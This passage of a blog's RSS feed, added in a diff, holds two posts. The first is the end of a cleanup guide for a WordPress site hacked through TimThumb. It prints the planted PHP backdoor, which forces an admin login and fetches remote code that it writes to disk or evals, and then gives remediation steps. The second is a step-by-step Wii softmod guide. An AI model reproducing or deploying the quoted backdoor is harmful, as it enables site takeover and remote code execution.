+&lt;span class=&quot;variable&quot;&gt;$user_login&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;'admin'&lt;/span&gt;;
+&lt;span class=&quot;variable&quot;&gt;$user&lt;/span&gt; = get_userdatabylogin(&lt;span class=&quot;variable&quot;&gt;$user_login&lt;/span&gt;);
+&lt;span class=&quot;variable&quot;&gt;$user_id&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$user&lt;/span&gt;-&amp;gt;ID;
+wp_set_current_user(&lt;span class=&quot;variable&quot;&gt;$user_id&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$user_login&lt;/span&gt;);
+wp_set_auth_cookie(&lt;span class=&quot;variable&quot;&gt;$user_id&lt;/span&gt;);
+do_action(&lt;span class=&quot;string&quot;&gt;'wp_login'&lt;/span&gt;, &lt;span class=&quot;variable&quot;&gt;$user_login&lt;/span&gt;);
+}
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pingnow'&lt;/span&gt;]== &lt;span class=&quot;string&quot;&gt;'exec'&lt;/span&gt;)&amp;amp;&amp;amp;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'file'&lt;/span&gt;]))){
+&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt; = curl_init(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'file'&lt;/span&gt;]);
+&lt;span class=&quot;variable&quot;&gt;$fnm&lt;/span&gt; = md5(rand(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;100&lt;/span&gt;)).&lt;span class=&quot;string&quot;&gt;'.php'&lt;/span&gt;;
+&lt;span class=&quot;variable&quot;&gt;$fp&lt;/span&gt; = fopen(&lt;span class=&quot;variable&quot;&gt;$fnm&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;w&quot;&lt;/span&gt;);
+curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_FILE, &lt;span class=&quot;variable&quot;&gt;$fp&lt;/span&gt;);
+curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);
+curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_TIMEOUT, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;);
+curl_exec(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;);
+curl_close(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;);
+fclose(&lt;span class=&quot;variable&quot;&gt;$fp&lt;/span&gt;);
+&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;SCRIPT LANGUAGE=&quot;&lt;/span&gt;JavaScript&lt;span class=&quot;string&quot;&gt;&quot;&amp;gt;location.href='$fnm';&amp;lt;/SCRIPT&amp;gt;&quot;&lt;/span&gt;;
+}
+&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'pingnow'&lt;/span&gt;]== &lt;span class=&quot;string&quot;&gt;'eval'&lt;/span&gt;)&amp;amp;&amp;amp;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'file'&lt;/span&gt;]))){
+&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt; = curl_init(&lt;span class=&quot;variable&quot;&gt;$_GET&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;'file'&lt;/span&gt;]);
+curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_RETURNTRANSFER, &lt;span class=&quot;keyword&quot;&gt;true&lt;/span&gt;);
+curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_HEADER, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);
+curl_setopt(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;, CURLOPT_TIMEOUT, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;);
+&lt;span class=&quot;variable&quot;&gt;$re&lt;/span&gt; = curl_exec(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;);
+curl_close(&lt;span class=&quot;variable&quot;&gt;$ch&lt;/span&gt;);
+&lt;span class=&quot;keyword&quot;&gt;eval&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$re&lt;/span&gt;);
+}}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;In your theme, look for anywhere the TimThumb script may be storing the cached files. These are generally along the lines of:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;wp-content/themes/theme-name/scripts/cache/external_{MD5Hash}.php
+wp-content/themes/theme-name/temp/cache/external_{MD5Hash}.php
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you found anything like the above, delete it straight away. If you’re not sure, delete every file that isn’t an image.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;Replace &lt;code&gt;timthumb.php&lt;/code&gt; with the latest version found at &lt;code&gt;http://timthumb.googlecode.com/svn/trunk/timthumb.php&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Change your MySQL and login password and update wp-config.php to correspond with the update.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Change the secret keys in &lt;code&gt;wp-config.php&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Clear your browsers cache and cookies.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Empty any page caching plugins you may have enabled to push the updates through to your visitors.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Throughout this, I also found a botting script and some spam black hat links. Make sure you scan your site using the &lt;a href=&quot;http://sitecheck.sucuri.net/scanner/&quot;&gt;Sucuri Site Scanner&lt;/a&gt; once again to make sure you removed all the exploits. When you are sure you have removed everything, submit your site to Google for review. This can be done in the &lt;code&gt;Diagnostics -&amp;gt; Malware&lt;/code&gt; tab of your Google Webmaster account. To keep up with anymore potential exploits, I would recommend following their fantastic blog found at &lt;a href=&quot;http://blog.sucuri.net/&quot;&gt;blog.sucuri.net&lt;/a&gt;.&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>Jailbreak Wii (Softmod) 3.0 – 4.2</title>
+      <link>http://www.armblog.pl/articles/wii-jailbreak-3-0-4-2/</link>
+      <pubDate>Tue, 12 Apr 2011 12:00:00 +0200</pubDate>
+      <guid isPermaLink="true">http://www.armblog.pl/articles/wii-jailbreak-3-0-4-2/</guid>
+      <author></author>
+      <description>&lt;p&gt;&lt;img src=&quot;http://d.pr/i/SvZy+&quot; alt=&quot;Homebrew Channel&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;IMPORTANT: This information is for research and academic purposes only! This info is not to be abused! I am not responsible for any damage that you may create!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Although I did successfully complete this guide on my own Wii console, it does not mean that this same process will successfully jailbreak your Wii console. Make sure you read and complete all steps appropriately.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Prerequisites&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Check your Wii version. This can be done by going to &lt;code&gt;Wii Settings -&amp;gt; Top Right Corner -&amp;gt; Your Wii&amp;#39;s Firmware &amp;amp; Region&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Jailbreak file [3.0-4.1] – &lt;a href=&quot;http://www.mediafire.com/?rv3w0le0nrf7mm1&quot;&gt;Mediafire&lt;/a&gt; (Password is &lt;code&gt;wiihacks&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Jailbreak file [4.2] – &lt;a href=&quot;http://www.mediafire.com/?9ulaa2elqvu7z4z&quot;&gt;Mediafire&lt;/a&gt; (Password is &lt;code&gt;wiihacks&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;SD card with 1GB or more.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Preparation&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Format your SD card to FAT32 or FAT16&lt;/li&gt;
+&lt;li&gt;Make Sure WiiConnect 24 is OFF&lt;/li&gt;
+&lt;li&gt;Unzip the previously downloaded jailbreak pack and place the files/folders onto the root of your SD card.&lt;/li&gt;
+&lt;li&gt;Always launch md5summer.exe to verify that the files have been downloaded properly and they are not corrupted.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;Step 1 – Installing Homebrew Channel and Bootmii&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;[3.0-4.1]&lt;/strong&gt; Go to Wii Options, then go to &lt;code&gt;Data Management -&amp;gt; Channels -&amp;gt; SD Card&lt;/code&gt;, click on &lt;code&gt;Bannerbomb channel&lt;/code&gt;, you will get a message saying “Load boot.elf/dol?”, select ‘Yes’ and the Hackmii installer will run.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;[4.2]&lt;/strong&gt; Click the SD Card Icon on the Wii Menu – “Load boot.elf/dol?”, select ‘Yes’ and the Hackmii installer will run.&lt;/p&gt;
+&lt;p&gt;In the Hackmii Installer, make sure to install the Homebrew Channel. If you can, also install Bootmii as boot2. When installing bootmii select prepare SD card, then install. “Bootmii as IOS” is installed automatically.&lt;/p&gt;
+&lt;p&gt;(If you receive an error stating “No vulnerable IOS”, &lt;a href=&quot;http://www.wiihacks.com/recommended-faqs-guides-tutorials-only/29080-hackmii-fix-no-vulnerable-ios-black-screen-scam-freeze.html&quot;&gt;complete these steps&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 2 – Backup Your Wii’s NAND (required)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;It is highly recommended to make a NAND Backup with bootmii as it can save you from 99% of bricks. That is, if you can install bootmii as boot2. You’ll need a SD Card with at least 550 MB free on it. Also, note bootmii can be picky about SD Cards so its best to avoid generic ones. The 2GB Sandisk SD Card is recommended.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; Place the SD Card into your wii and power it on. If bootmii was installed as boot2, the bootmii screen should automatically appear, if it was installed as an IOS, then you’ll have to go to homebrew channel, press “home” on your wiimote then select “Launch Bootmii”&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;b)&lt;/strong&gt; Navigate using the power/reset buttons on the front of your console and select the icon with the gears on it. If the console buttons don’t work, you’ll have to use a gamecube controller.&lt;/p&gt;
+&lt;p&gt;Power = Browse
+Reset = Select&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Now select the icon that has the Green arrow pointing to a SD Card but from the chip. Then follow the on-screen instructions to backup your NAND.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;d)&lt;/strong&gt; In 10 – 15 minutes, the NAND Backup should be complete. You may get a few bad blocks but any number of bad blocks under 80 is normal and fine. Once all is done, you can exit bootmii.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;e)&lt;/strong&gt; Remove the SD Card from your wii and insert into your PC, backup the ‘bootmii’ folder, the ‘NAND.bin’ file and ‘key.bin’ file from your sd card onto a safe place on your PC. Once these files/folders are on your PC, delete them from your SD Card. If you do not and bootmii as boot2 is installed, it will load everytime!&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;DO NOT LOSE YOUR NAND.BIN OR KEYS.BIN&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;If you were to ever fully brick the wii, just copy the bootmii folder and ‘NAND.bin’ from your PC onto the root of your SD Card. Then repeat parts &lt;code&gt;a&lt;/code&gt;, &lt;code&gt;b&lt;/code&gt; &amp;amp; &lt;code&gt;c&lt;/code&gt; but this time selecting the icon that points to the chip. While &lt;code&gt;bootmii&lt;/code&gt;/&lt;code&gt;boot2&lt;/code&gt; can save you from full bricks, &lt;code&gt;bootmii&lt;/code&gt;/&lt;code&gt;IOS&lt;/code&gt; cannot! It is not recommended to use &lt;code&gt;bootmii&lt;/code&gt; as an &lt;code&gt;IOS&lt;/code&gt; to restore your NAND! If you can only install as an &lt;code&gt;IOS&lt;/code&gt;, your nand backup is still useful, keep it safe.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 3 – Modding your Wii (the jailbreak)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;[3.0-4.1 Only]&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; Put the SD card into the Wii&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;b)&lt;/strong&gt; Open The Homebrew channel and select Multi-Mod Manager. Go to &lt;code&gt;Install &amp;amp; Patch iOS36 -&amp;gt; Express Install&lt;/code&gt; - When completed press &lt;code&gt;B&lt;/code&gt; to go back into main menu go to the bottom choice &lt;code&gt;Load Another IOS&lt;/code&gt; and select &lt;code&gt;IOS236&lt;/code&gt; (this should already be selected).&lt;/p&gt;
+&lt;p&gt;In Multi-Mod Manager go into &lt;code&gt;Wad Manager&lt;/code&gt;, it should display these wads.&lt;/p&gt;
+&lt;p&gt;(These are to softmod your Wii)&lt;/p&gt;
+&lt;p&gt;  iOS60-[6174]-Patched.wad
+  cIOS249[56]-rev20.wad
+  cIOS250[57]-rev65535.wad
+  cIOS223[37+38]-rev4.wad
+  cIOS222[38]-rev4.wad&lt;/p&gt;
+&lt;p&gt;(These are to install the extra IOS files)&lt;/p&gt;
+&lt;p&gt;  iOS53-64-v5663.wad
+  iOS55-64-v5663.wad
+  iOS56-64-v5662.wad
+  iOS57-64-v5919.wad
+  iOS58-64-v6176.wad&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Press 1 on Wiimote to install all these wads at once, Press A to confirm. If you get an error do not exit until they all install correctly. Retry installing&lt;/p&gt;
+&lt;p&gt;After it installs correctly press the HOME button on Wiimote until you’re back in main Multi-Mod Manager Menu.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;[4.2 Only]&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; SD card in the Wii
+&lt;strong&gt;b)&lt;/strong&gt; Open The Homebrew channel and select Multi-Mod Manager. Go to &lt;code&gt;Install &amp;amp; Patch iOS36 -&amp;gt; Express Install&lt;/code&gt; - Once completed press B to go back into main menu go to the bottom choice &lt;code&gt;Load Another IOS&lt;/code&gt; and select &lt;code&gt;IOS236&lt;/code&gt; (this should already be selected).&lt;/p&gt;
+&lt;p&gt;In Multi-Mod Manager go into Wad Manager, it should display these wads.&lt;/p&gt;
+&lt;p&gt;(These are to softmod your wii)&lt;/p&gt;
+&lt;p&gt;  iOS70-[6687]-Patched.wad
+  cIOS249[56]-rev20.wad
+  cIOS250[57]-rev65535.wad
+  cIOS222[38]-rev4.wad
+  cIOS223[37+38]-rev4.wad&lt;/p&gt;
+&lt;p&gt;(These are the IOS your Wii needs)&lt;/p&gt;
+&lt;p&gt;  iOS56-64-v5662.wad
+  iOS57-64-v5919.wad
+  iOS58-64-v6176.wad&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Press 1 on wiimote to install all these wads at once, Press A to confirm. If you get an error do not exit until they install correctly. Retry installing.&lt;/p&gt;
+&lt;p&gt;After they have all installed correctly press the B button on Wiimote until you’re back in main Multi-Mod Manager Menu.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 4 – Installing Priiloader&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;HBC -&amp;gt; Load up MMM&lt;/code&gt;. Make sure where it says Load another ios [IOS236 is Selected]&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;a)&lt;/strong&gt; &lt;code&gt;Multi-Mod Manager -&amp;gt; App Manager -&amp;gt; Select Priiloader&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;b)&lt;/strong&gt; It Should Load up Press + to Install&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;c)&lt;/strong&gt; Your Wii should reboot into Homebrew Channel after the installation. Press the HOME button and power off your Wii. Hold reset on the console while turning it on to boot into Priiloader. Go to System Menu Hacks and enable ‘Block Disc Updates’ &amp;amp; ‘Block Online Updates’, select ‘Save Settings’ when finished. Press B on the Wiimote to go back to the main menu, next go to Settings and use the d-pad to set Autoboot: System Menu. Then select Save Settings. Press B to go back to the main menu.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;d)&lt;/strong&gt; In the main menu in priiloader, select Launch Title and select the HomeBrew Channel to check if its working properly.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 5 – Getting HBC to use iOS58 for USB2 Support&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;From the Homebrew channel load up the hackmii installer and reinstall the Homebrew channel. This will make it use ios58 for USB2 Support.To check your HBC is using iOS58 press the home button when in HBC and it should tell you in top right corner.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 6 – Install more apps&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;This is what the whole jailbreak process was for, installing custom apps. Here is a list of some awesome apps, starting at my favourite.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.wiimc.org/downloads/&quot;&gt;WiiMC&lt;/a&gt; – Wii Media Center&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/other-faq-guides-tutorials/68251-guide-homebrew-browser.html&quot;&gt;Homebrew Browser&lt;/a&gt; - Wii Homebrew App Store&lt;/li&gt;
+&lt;li&gt;Update the &lt;a href=&quot;http://www.wiihacks.com/general-homebrew-hack-issues/67034-update-shopping-channel-v20-guide.html&quot;&gt;Wii Shopping Channel&lt;/a&gt; to v20&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/recommended-faqs-guides-tutorials-only/47802-play-gamecube-backups-your-wii.html&quot;&gt;Play Gamecube games&lt;/a&gt; on your Wii&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/emulators-downloads/&quot;&gt;Emulators&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;http://www.wiihacks.com/other-faq-guides-tutorials/66235-ftpii-guide.html&quot;&gt;Wii FTP&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;And you are done!&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Special thanks to author, &lt;em&gt;Cile&lt;/em&gt;, for the original guide over at &lt;a href=&quot;http://www.wiihacks.com/recommended-faqs-guides-tutorials-only/69690-softmod-3-0-4-2-e-u-j-wiis.html&quot;&gt;WiiHacks&lt;/a&gt;.&lt;/p&gt;
+</description>
+    </item>
+  </channel>
+</rss>
